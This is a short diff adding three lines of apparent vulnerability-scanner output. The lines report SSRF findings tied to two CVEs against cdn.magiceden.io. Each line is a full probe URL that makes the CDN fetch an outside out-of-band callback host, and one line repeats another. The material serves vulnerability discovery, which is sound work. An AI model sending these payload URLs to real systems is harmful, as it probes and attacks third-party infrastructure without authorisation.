@@ -1,0 +1,3 @@
+[CVE-2025-24354] [http] [medium] https://cdn.magiceden.io/unsafe/plain/http://db12pj9n4nojjlff6vn0tyho5pd6c7tz7.oast.online
+[CVE-2023-30019] [http] [medium] https://cdn.magiceden.io/111/rs:fit:400:400:0:0/plain/http://db12pj9n4nojjlff6vn0aj13z6517ix4b.oast.online
+[CVE-2023-30019] [http] [medium] https://cdn.magiceden.io/111/rs:fit:400:400:0:0/plain/http://db12pj9n4nojjlff6vn0aj13z6517ix4b.oast.online
